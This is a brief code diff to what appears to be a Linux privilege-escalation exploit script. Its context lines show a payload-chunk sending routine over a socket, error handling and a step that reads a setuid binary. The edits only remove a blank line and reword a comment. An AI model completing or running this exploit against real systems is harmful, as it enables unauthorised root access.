@@ -13,7 +13,6 @@ if len(sys.argv) == 2: # custom payload is specified
 
 
 def send(fd, offset, chunk): 
-
     conn.sendmsg(
         [b"A" * 4 + chunk],
         [
@@ -48,7 +47,7 @@ def send(fd, offset, chunk):
         if e.errno is errno.EBADMSG:
             print(f"expected error: {e.strerror} @ offset = {offset}")
         else:
-            raise # unexpected error, maybe something unexpected happened?
+            raise # unexpected error, maybe something else happened?
 
 
 # read setuid binary
